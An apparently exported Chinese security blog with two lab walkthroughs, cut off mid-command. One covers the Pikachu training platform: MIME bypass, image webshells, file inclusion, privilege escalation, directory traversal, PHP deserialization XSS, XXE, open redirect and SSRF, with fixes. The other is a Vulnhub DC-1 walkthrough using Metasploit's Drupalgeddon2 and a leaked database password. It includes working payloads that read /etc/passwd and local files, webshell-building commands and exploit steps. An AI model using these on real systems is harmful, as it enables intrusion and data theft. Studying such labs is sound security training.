**当一个浏览器对一个文件进行识别的时候，他会给文件定义一个类型，放在http的头部的Content-type里面，比如上传图片，就会自动识别是jpg或者png等**\n\n**上传php文件，提示只能上传图片。**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529094736.png)**\n\n**根据提示看，应该只进行了 Content-Type 类型校验，可以通过修改`MIME`类型来绕过，我们正常上传 php 文件，然后直接将其文件类型修改为 `image/png`**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200529095523.png)**\n\n**然后就可以成功上传了**\n\n### **getimagesize**\n\n**getimagesize 函数会检测文件是否是图片，所以得通过制作图马来绕过这个函数检测。**\n\n**图片马制作**\n\n- **Windows 下 图马制作**\n\n**方法一：**\n**我们需要一张图片`1.jpg `和一句话木马写好的php文件`1.php`** \n**将1.jpg和1.php放到同一目录下,**\n**然后在该目录下用cmd执行命令`copy 1.jpg/b + 1.php/a 2.jpg `**\n**新生成的2.jpg就是我们制作好的图片马**\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5d295bd449c1993400.png)**\n**方法二：**\n**HxD打开一张图片`1.jpg`**\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5d295be59cb6829409.png)**\n**在图片末尾加上一句话木马，保存得到的图片就是图片马了**\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/5d295c7214fb631104.png)**\n\n- **Linux 下 图马制作**\n\n```bash\n#方法1 将shell.php内容追加到muma.png\ncat shell.php >> muma.png\n\n#方法2 png+php合成png图马\ncat a.png shell.php >> muma.png\n\n#方法3 直接使用echo追加到png中\necho '<?php phpinfo();?>' >> muma.png\n```\n\n**将制作好的图片马上传**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200529110623157.png)**\n\n**但是服务器将木马文件解析成了图片文件，因此向其发送执行该文件的请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。我们需要利用前面的`文件包含漏洞`可以将图片格式的文件当做php文件来解析执行**\n\n```\nhttp://127.0.0.1/pikachu-master/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2020/05/29/6589365ed07a93cc13b725773978.jpg&submit=%E6%8F%90%E4%BA%A4\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200529110401162.png)**\n\n\n\n### **文件上传漏洞防范**\n\n- **验证文件类型、后缀名、大小;**\n- **验证文件的上传方式;**\n- **对上传的文件进行一定复杂的重命名;**\n- **不要暴露文件上传后的路径;**\n\n##  **over permission**\n\n> **如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为`越权操作`。 越权漏洞形成的原因是后台使用了不合理的权限校验规则导致的。一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。**\n>\n> **因此，在在权限管理中应该遵守：**\n> **1.使用最小权限原则对用户进行赋权;**\n> **2.使用合理（严格）的权限校验规则;**\n> **3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;**\n\n### **水平越权**\n\n>**A用户和B用户属于同一级别用户，但各自不能操作对方个人信息。A用户如果越权操作B用户个人信息的情况称为水平越权操作。**\n\n**1、点击右上角的提示，存在三个用户，【lucy/123456,lili/123456,kobe/123456】**\n\n**2、登录用户lucy，可以查看lucy的信息，**\n\n**3、我们将URL中的username改为lili或kobe，发现能成功越权查看到lili或kobe的信息，这也就说明存在水平越权漏洞**\n\n**源码分析**\n\n```php\n// 判断是否登录，没有登录不能访问\nif(!check_op_login($link)){\n    header(\"location:op1_login.php\");\n}\n$html='';\nif(isset($_GET['submit']) && $_GET['username']!=null){\n    //没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定\n    $username=escape($link, $_GET['username']);\n    $query=\"select * from member where username='$username'\";\n```\n\n **只判断了是否登录，并没有验证传入的username是不是当前登录用户**\n\n### **垂直越权**\n\n> **A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。**\n\n**1、点击右上角的提示，存在两个用户，【admin/123456,pikachu/000000,admin是超级boss】**\n\n**2、登录超级用户admin，可以查看所有用户信息，并且可以创建新用户**\n\n**3、点击添加用户，输入jwt用户信息，然后打开Burp，进行抓包，发现Cookie中有PHPSESSID，再发送到`repeater`，进行发包，成功添加新用户jwt**\n\n**4、登录普通用户pikachu，只有查看用户信息的权限；然后使用Burp抓取其登录态的Cookie，将Cookie复制到上面超级管理员登录时的Cookie位置,最后点击`Go`**\n\n**5、刷新页面,看到创建了两个jwt用户，第一个是admin创建的，第二个是pikachu创建的，普通用户pikachu也成功创建用户，这就实现了垂直越权**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200713140917.png)**\n\n**源码分析**\n\n```php\n//目录结构\nop2_admin.php\nop2_admin_edit.php\nop2_login.php\nop2_user.php\n```\n\n**有一个`op2_login.php`，进行登录判断，如果级别是1，进入`op2_admin.php`；如果级别是2，进入`op2_user.php`，登入admin用户界面，有个`admin_edit.php`页面，可以添加新用户，但是添加新用户时，只是验证了登录状态，并没有验证级别，所以存在越权问题。**\n\n```php\n//admin_edit.php 22-25行\n// 判断是否登录，没有登录不能访问\n//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。\nif(!check_op2_login($link)){\n    header(\"location:op2_login.php\");\n    exit();\n}\n```\n\n### **CTF例子**\n\n**[NKCTF-web（记一次越权）](https://blog.csdn.net/jiyi_guoshu/article/details/88544274)**\n\n## **Directory Traversal**\n\n>**在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。**\n>\n>**看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。**\n>\n>**需要区分一下的是,如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露，而并不归为目录遍历漏洞。**\n\n**随意点击页面，得到跳转链接。**\n\n```\nhttp://127.0.0.1/pikachu-master/vul/dir/dir_list.php?title=truman.php\n```\n\n**可以看到`URL`中有文件名，那我们可以进行构造，实现目录遍历**\n\n```\n?title=../../../../phpinfo.php\n?title=../../../../Windows/win.ini\n\n去掉url中的参数，列出了dir文件夹里面所有的文件，这种情景称为敏感信息泄露，而并不归为目录遍历漏洞。\nhttp://127.0.0.1/pikachu-master/vul/dir/\n```\n\n**源码分析**\n\n```php\n$html='';\nif(isset($_GET['title'])){\n    $filename=$_GET['title'];\n    //这里直接把传进来的内容进行了require(),造成问题\n    require \"soup/$filename\";\n//    echo $html;\n}\n```\n\n**修复**\n\n**白名单或者过滤用户输入，比如过滤`../`**\n\n## **敏感信息泄露**\n\n>**由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：**\n>**---通过访问url下的目录，可以直接列出目录下的文件列表;**\n>**---输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;**\n>**---前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;**\n>\n>**类似以上这些情况，我称为敏感信息泄露。**\n\n**1.打开界面是一个登陆页面，查看源码发现敏感信息**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200714090924.png)**\n\n**2.登陆之后发现abc.php**\n\n**3.不登录直接将findabc.php改为abc.php也可访问**\n\n## **PHP反序列化**\n\n**在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。**\n\n**序列化serialize()**\n**序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:**\n\n```php\n    class S{\n        public $test=\"pikachu\";\n    }\n    $s=new S(); //创建一个对象\n    serialize($s); //把这个对象进行序列化\n    序列化后得到的结果是这个样子的:O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\n        O:代表object\n        1:代表对象名字长度为一个字符\n        S:对象的名称\n        1:代表对象里面有一个变量\n        s:数据类型\n        4:变量名称的长度\n        test:变量名称\n        s:数据类型\n        7:变量值的长度\n        pikachu:变量值\n```\n\n**反序列化unserialize()**\n\n**就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。**\n\n```php\n    $u=unserialize(\"O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\");\n    echo $u->test; //得到的结果为pikachu\n```\n\n**序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题**\n\n```php\n        常见的几个魔法函数:\n        __construct()当一个对象创建时被调用\n\n        __destruct()当一个对象销毁时被调用\n\n        __toString()当一个对象被当作一个字符串使用\n\n        __sleep() 在对象在被序列化之前运行\n\n        __wakeup将在序列化之后立即被调用\n\n        漏洞举例:定义一个类，写一个function，这个function直接使用了魔法方法\n        class S{\n            var $test = \"pikachu\";\n            function __destruct(){\n                echo $this->test;\n            }\n        }\n        $s = $_GET['test'];\n        @$unser = unserialize($a);\n\n        payload:O:1:\"S\":1:{s:4:\"test\";s:29:\"<script>alert('xss')</script>\";}\n```\n\n**源码分析**\n\n```php\nclass S{\n    var $test = \"pikachu\";\n    function __construct(){\n        echo $this->test;\n    }\n}\n\n\n//O:1:\"S\":1:{s:4:\"test\";s:29:\"<script>alert('xss')</script>\";}\n$html='';\nif(isset($_POST['o'])){\n    $s = $_POST['o'];\n    if(!@$unser = unserialize($s)){\n        $html.=\"<p>大兄弟,来点劲爆点儿的!</p>\";\n    }else{\n        $html.=\"<p>{$unser->test}</p>\";\n    }\n\n}\n```\n\n**没有对用户传进来的参数做过滤，直接反序列化。**\n\n**利用相似的代码生成一个反序列化的字符串**\n\n```php\n<?php\nclass S{\n    var $test = \"<script>alert('xss')</script>\";\n}\n$a = new S();\necho serialize($a);\n?>\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715113815.png)**\n\n**提交payload:`O:1:\"S\":1:{s:4:\"test\";s:29:\"<script>alert('xss')</script>\";}`**\n\n**反序列化的结果是一个 JS 的弹窗，我们提交后就能进行 XSS 攻击**\n\n## **XXE**\n\n### **基础知识准备**\n\n> **XXE -\"xml external entity injection\" 即\"xml外部实体注入漏洞\"。**\n> **概括一下就是\"攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题\"**\n> **也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。**\n> **现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。**\n> **以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。**\n>\n> **本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。**\n\n**XML是可扩展的标记语言（E`X`tensible `M`arkup `L`anguage），设计用来进行数据的传输和存储， 结构是树形结构，由标签构成，这点很像HTML语言。但是XML和HTML有明显区别如下：**\n\n```\nXML 被设计用来传输和存储数据，其焦点是数据的内容。\nHTML 被设计用来显示数据，其焦点是数据的外观。\n```\n\n**XML语法结构大致如下**\n\n```xml\n第一部分：XML声明部分\n<?xml version=\"1.0\"?>\n\n第二部分：文档类型定义 DTD\n<!DOCTYPE note[ \n<!--定义此文档是note类型的文档-->\n<!ENTITY entity-name SYSTEM \"URI/URL\">\n<!--外部实体声明-->\n]>\n\n第三部分：文档元素\n<note>\n<to>Dave</to>\n<from>Tom</from>\n<head>Reminder</head>\n<body>You are a good man</body>\n</note>\n```\n\n**DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD，现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。**\n\n```xml\n① 内部申明DTD格式\n<!DOCTYPE 根元素 [元素申明]>\n\n② 外部引用DTD格式\n<!DOCTYPE 根元素 SYSTEM \"外部DTD的URI\">\n\n③ 引用公共DTD格式\n<!DOCTYPE 根元素 PUBLIC \"DTD标识名\" \"公共DTD的URI\">\n```\n\n### **Pikachu**\n\n**内部实体引用 Payload**\n\n```xml\n<?xml version = \"1.0\"?>\n<!DOCTYPE note [\n    <!ENTITY hacker \"hihihi\">\n]>\n<name>&hacker;</name>\n```\n\n**如果用构造的`payload`始终无法成功，修改一哈PhpStudy的php版本即可**\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715113809.png)**\n\n**外部实体引用 Payload**\n\n**![外部引用支持的协议](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715114611.png)**\n\n**在D盘下新建一个jwt.txt,内容为hahaha,作为我们要读取的文件**\n\n**使用file协议读取**\n\n```xml\n<?xml version=\"1.0\"  encoding=\"UTF-8\"?>\n<!DOCTYPE name [\n<!ENTITY f SYSTEM \"file:///D://jwt.txt\">]>\n<name>&f;</name>\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715115834.png)**\n\n**使用php协议读取**\n\n```xml\n<?xml version = \"1.0\"?>\n<!DOCTYPE ANY [\n    <!ENTITY f SYSTEM \"php://filter/read=convert.base64-encode/resource=D://jwt.txt\">\n]>\n<x>&f;</x>\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715120128.png)**\n\n**Linux下读取**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE ANY[ \n<!ENTITY f SYSTEM \"file:///etc/passwd\">\n]>\n<x>&f;</x>\n```\n\n**源码分析**\n\n```php\n$html='';\nif(isset($_POST['submit']) and $_POST['xml'] != null){\n    $xml =$_POST['xml'];\n    $data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);//添加了LIBXML_NOENT参数开启了外部实体解析\n    if($data){\n        $html.=\"<pre>{$data}</pre>\";\n    }else{\n        $html.=\"<p>XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?</p>\";\n    }\n}\n```\n\n**如果一个接口支持接收XML数据，且没有对XML数据做任何安全上的措施，就可能导致XXE漏洞。**\n\n**simplexml_load_string()函数转换形式良好的XML字符串为SimpleXMLElement对象。**\n\n### **XXE漏洞防范**\n\n**方案：使用开发语言提供的禁用外部实体的方法**\n**1.PHP：**\n\n```php\nlibxml_disable_entity_loader(true);\n```\n\n**2.JAVA：**\n\n```java\nDocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();\ndbf.setExpandEntityReferences(false);\n```\n\n**3.Python：**\n\n```python\nfrom lxml import etree\nxmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n```\n\n### **CTF实例**\n\n#### **题目 Jarvis OJ--api调用**\n\n**题目地址：http://web.jarvisoj.com:9882/**\n\n**解题思路:**\n\n**XXE漏洞就是服务器接受从客户端发送来的xml格式数据时，xml数据中恶意的引用了外部实体，将它的值绑定为服务器的目标文件，这样在服务器返回给我们解析后的值时，就会把目标文件的内容返回给我们，我们就读取了敏感文件。**\n\n**这道题目，默认的是json格式传递，因此首先我们更改`Content-Type`的值为`application/xml`,然后传入xml代码：**\n\n**Payload**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE ANY[ \n<!ENTITY f SYSTEM \"file:///home/ctf/flag.txt\">\n]>\n<x>&f;</x>\n```\n\n**![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715165006.png)**\n\n## **URL重定向**\n\n>**不安全的URL跳转问题可能发生在一切执行了URL地址跳转的地方。**\n>**如果后端采用了前端传进来的参数(可能是用户传参,或者之前预埋在前端页面的URL地址)作为了跳转的目的地,而又没有做判断的话就可能发生\"跳错对象\"的问题。**\n>\n>**URL跳转比较直接的危害是:-->钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站**\n\n**1.进入页面是四个超链接，依次点一遍，点到最后一句时，发现URL带有参数**\n\n```url\nhttp://127.0.0.1/pikachu-master/vul/urlredirect/urlredirect.php?url=i\n```\n\n**2.我们可以直接把参数`i`,改为钓鱼网站的网址，这里我就假设我的博客是钓鱼网站**\n\n```url\nhttp://127.0.0.1/pikachu-master/vul/urlredirect/urlredirect.php?url=https://jwt1399.top\n```\n\n**3.把上面这个URL发送给用户，用户点击就会跳转到钓鱼网站**\n\n**源码分析**\n\n```php\n$html=\"\";\nif(isset($_GET['url']) && $_GET['url'] != null){\n    $url = $_GET['url'];\n    if($url == 'i'){\n        $html.=\"<p>好的,希望你能坚持做你自己!</p>\";\n    }else {\n        header(\"location:{$url}\");\n    }\n}\n```\n\n**通过GET请求获取前端传进来的url，判断是否等于i，如果不等，就跳转到url对应的地址去。这就存在URL重定向问题。**\n\n **修复**\n\n**对url进行白名单的限制，如果不在白名单，就跳转到固定的页面**\n\n## **SSRF**\n\n> **SSRF(Server-Side Request Forgery:服务器端请求伪造)，其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制**\n>\n> **导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据**\n>\n> **数据流:攻击者----->服务器---->目标地址**\n>\n> **简单理解：服务器接受了客户端输入的URL，然后服务器端拿URL去请求并返回给你。**\n\n**根据后台使用的函数的不同,对应的影响和利用方法又有不一样**\n```\nPHP中下面函数的使用不当会导致SSRF:\nfile_get_contents()\nfsockopen()\ncurl_exec()    \n```\n\n**如果一定要通过后台服务器远程去对用户指定(\"或者预埋在前端的请求\")的地址进行资源请求,则请做好目标地址的过滤。**\n\n### **curl**\n\n**PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。**\n\n**libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。**\n\n**curl函数参考：https://www.runoob.com/php/php-ref-curl.html**\n\n```\n//file协议读取\n?url=file:///D://jwt.txt\n\n//gopher协议\n//基本协议格式：URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流\n?url=gopher://119.23.243.154:22\n\n//dict协议\n?url=dict://119.23.243.154:22\n\n//http/https协议\n?url=http://x.x.x.x/\n?url=https://x.x.x.x/\n\n//探测内网其他主机的端口\n?url=http://x.x.x.x:port\n```\n\n| **file协议**                                                 | **http/https协议**                                           | **端口**                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| **![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715182340.png)** | **![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715182343.png)** | **![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/20200715182346.png)** |\n\n**源码分析**\n\n```php\nif(isset($_GET['url']) && $_GET['url'] != null){\n    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF\n    $URL = $_GET['url'];\n    $CH = curl_init($URL);\n    curl_setopt($CH, CURLOPT_HEADER, FALSE);\n    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);\n    $RES = curl_exec($CH);\n    curl_close($CH) ;\n    echo $RES;\n}\n```\n\n**前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端，并且没做任何过滤或限制。从而导致了用户可能可以通过这个漏洞进行一些内网服务探测等等**\n\n**参考：[SSRF原理实战及修复方式](https://segmentfault.com/a/1190000021810264)**\n\n### **file_get_content**\n\n**file_get_contents() 把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。**\n\n**函数语法:  file_get_contents(path,include_path,context,start,max_length)**\n\n| **参数**         | **描述**                                                     |\n| ---------------- | ------------------------------------------------------------ |\n| **path**         | **必需。规定要读取的文件。**                                 |\n| **include_path** | **可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 '1'。** |\n| **context**      | **可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。** |\n| **start**        | **可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。** |\n| **max_length**   | **可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。**      |\n\n```\n//file协议读取\n?file=file:///D://jwt.txt\n\n//读取php源码\n?file=php://filter/read=convert.base64-encode/resource=ssrf.php\n\n//内网其它主机请求\n?file=http://x.x.x.x/xx.index\n\n//探测内网其他主机的端口\n?file=http://x.x.x.x:port\n\t\n```\n\n**源码分析**\n\n```php\nif(isset($_GET['file']) && $_GET['file'] !=null){\n    $filename = $_GET['file'];\n    $str = file_get_contents($filename);\n    echo $str;\n}\n```\n\n**直接访问获取到的文件**\n\n### **SSRF防范**\n\n**1.可以采取白名单,限制内网Ip。**\n**2.对返回内容进行识别**\n**3.禁用一些不必要的协议**\n**4.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态**\n\n**参考：[CTF Wiki-SSRF](https://wiki.x10sec.org/web/ssrf/)、[SSRF 学习记录](https://hackmd.io/@Lhaihai/H1B8PJ9hX?type=view#SSRF-学习记录)、[SSRF漏洞分析与利用](http://www.91ri.org/17111.html)**\n\n### **CTF实例**\n\n**题目：hackme--XSSRF**\n\n**题目地址：https://xssrf.hackme.inndy.tw/**\n\n**解题思路：**\n\n**这个题一共有三关，xss->ssrf->redis**\n\n**参考：**\n\n**[XSS的威力：从XSS到SSRF再到Redis](https://www.anquanke.com/post/id/156377)**\n\n**[xss->ssrf->redis](https://skysec.top/2018/08/17/xss-ssrf-redis/)**\n\n**[XSSme题目复现](http://www.northity.com/2018/10/23/XSSme题目复现/)**\n\n\n\n## **赞助💰**\n\n**如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭**\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["靶场","Web基础漏洞"],"categories":["Web"]},{"title":"Vulnhub靶机：DC-1","url":"/posts/8808.html","content":"## Vulnhub\n\n### 简介\n\nVulnhub是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，挑战的目标是获取操作系统的root权限和查看flag。\n\n### 部署方法\n\n官网：https://www.vulnhub.com\n\n1.在官网搜索你想要的镜像,然后下载【建议下载 (Mirror)版本】\n\n2.下载好后解压得到`.ova`的文件，右击选择VMware进行打开\n\n3.在弹出的框中，选择存放的位置，然后点击导入\n\n4.最后等待导入完成，然后启动该虚拟机就可以了\n\n## DC-1__drupal\n\n### 零、简介\n\n**靶机下载地址：**https://download.vulnhub.com/dc/DC-1.zip\n\n**靶机描述：**DC-1 是一个专门构建的易受攻击的实验室，旨在获得渗透测试领域的经验。共有五个flag，但最终目标是拿到root目录中的flag。\n\n**涉及漏洞：**[CVE-2018-7600](http://vulhub.org.cn/vuln/VH-CVE-2018-7600)      [CVE-2018-7600](http://vulhub.org.cn/vuln/VH-CVE-2018-7600) \n\n**参考：**[CVE-2018-7600 Drupal核心远程代码执行漏洞分析](https://www.anquanke.com/post/id/104697)     [Uncovering Drupalgeddon 2](https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/)\n\n**攻击机：**Kali/192.168.0.104\n\n### 一、信息收集\n\n运行部署好的虚拟机，提示需要账号密码，该靶机不提供密码需要自己去渗透提权\n\n![](https://i.loli.net/2020/05/16/NHTOKwQBoXLgEU8.png)\n\n**因不知道DC-1靶机的IP，所有我们需要将靶机和攻击机kali放在同一个局域网里面，将Kali的网络适配器使用`桥接模式`**\n\n#### 1.探测目标\n\n**方法一：使用arp-scan工具**\n\n探测同一区域中存活主机\n\n```bash\n$ sudo arp-scan -l\n\n-l 使用网络接口\n```\n\n![](https://i.loli.net/2020/05/16/TroRKx1gVv3hZF2.png)\n\n[kali之arp-scan](https://blog.csdn.net/weixin_43221560/article/details/90550294)\n\n**方法二：使用netdiscover工具**\n\n探测存活主机\n\n```bash\n$ sudo netdiscover -i eth0\n\n-i device 用于嗅探和注入数据包的网络接口\n```\n\n![](https://i.loli.net/2020/05/16/CKZuIEU3P9T4gqn.png)\n\n[netdiscover用法](https://manpages.debian.org/unstable/netdiscover/netdiscover.8.en.html)\n\n**方法三：使用nmap工具**\n\n```bash\n$ sudo ifconfig #查看kali的ip【192.168.0.103】\n$ nmap 192.168.0.0/24\n```\n\n#### 2.查看目标开放端口\n\n```bash\n$ nmap -sV -p- 192.168.0.119\n\n-sV 用来扫描目标主机和端口上运行的软件的版本\n-p- 扫描0-65535全部端口\n```\n\n![](https://i.loli.net/2020/05/16/b4VFOxylKc9h2wS.png)\n\n目标靶机开放了80端口,在浏览器打开该站点\n\n#### 3.查看网页相关信息\n\n使用浏览器插件`Wappalyzer`，这个插件可以检测网站的CMS，框架，服务器等信息，\n\n可以看到该网站使用CMS为`Drupal`，其实在网页界面和底部都能发现是Drupal\n\n![](https://i.loli.net/2020/05/16/FwIa8NtxdBA2JPi.png)\n\n\n\n### 二、漏洞查找与利用\n\n#### 1.漏洞查找\n\n使用Metasploit搜索Drupal\n\n```bash\n$ sudo msfdb init && msfconsole\n$ search Drupal\n```\n\n![](https://i.loli.net/2020/05/16/KLMDfthcud8Ik6g.png)\n\n#### 2.漏洞利用\n\n优先选择上面查到模块的Rank为excellent并且时间较新的模块，这里我们使用第4个\n\n```bash\n$ use exploit/unix/webapp/drupal_drupalgeddon2 \n$ show options\n$ set RHOSTS 192.168.0.119\n$ exploit 或者 run\n#当出现“Meterpreter session 1 opened”说明利用成功\n```\n\n![](https://i.loli.net/2020/05/16/xjtqeUwfM5FpykP.png)\n\n![](https://i.loli.net/2020/05/16/HI5EX9xpeVTyBcr.png)\n\n[MSF之命令笔记篇](http://sh1yan.top/2019/07/28/MSF-Command-Notes/)\n\n### 三、Getshell\n\n#### 1.获取普通shell\n\n```bash\nmeterpreter >shell\nls\n```\n\n![](https://i.loli.net/2020/05/16/8gem543oQr6LZTc.png)\n\n发现有个`flag1.txt`，打开看一哈\n\n```bash\n$ cat flag1.txt\nEvery good CMS needs a config file - and so do you.\n```\n\n翻译：每一个好的CMS都需要一个配置文件，你也一样。\n\n百度查到Drupal的默认配置文件为 `/var/www/sites/default/settings.php`\n\n[drupal7的目录结构及术语](https://www.iteye.com/blog/justcoding-1407697)\n\n```bash\ncat /var/www/sites/default/settings.php\n```\n\n![](https://i.loli.net/2020/05/16/rRTl5Ng4yoJDX1L.png)\n\n配置文件中看到了`flag2`\n\n翻译:蛮力和字典攻击不行，唯一方法是获得访问权限(你将需要访问的)。你能用这些凭证做什么?\n\n同时，还有获得了数据库账号和密码\n\n```\n'username' => 'dbuser',\n'password' => 'R0ck3t',\n```\n#### 2.获取交互式shell\n\n使用python反弹一个交互式shell，然后我们登陆数据库\n\n```bash\n$ python -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n$ mysql -udbuser -p\nEnter 